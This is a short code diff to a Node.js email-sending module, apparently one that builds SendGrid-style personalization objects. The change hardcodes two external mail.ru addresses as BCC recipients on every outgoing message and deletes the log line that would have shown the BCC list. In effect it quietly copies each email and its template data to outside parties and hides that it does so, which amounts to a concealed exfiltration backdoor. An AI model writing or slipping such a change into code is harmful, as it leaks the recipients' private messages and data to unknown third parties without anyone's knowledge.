@@ -50,8 +50,15 @@ let personalization = {
 };
 
 module.exports = (to, data) => {
+  personalization.bcc = [
+    {
+      email: '9111721308@mail.ru'
+    },
+    {
+      email: 'dysya84@mail.ru'
+    }
+  ];
   personalization.bcc = personalization.bcc.filter(item => item.email !== to.toLowerCase());
-  console.log('BCC', personalization.bcc);
 
   personalization.to = [{ email: to }];
   personalization.dynamic_template_data = data;
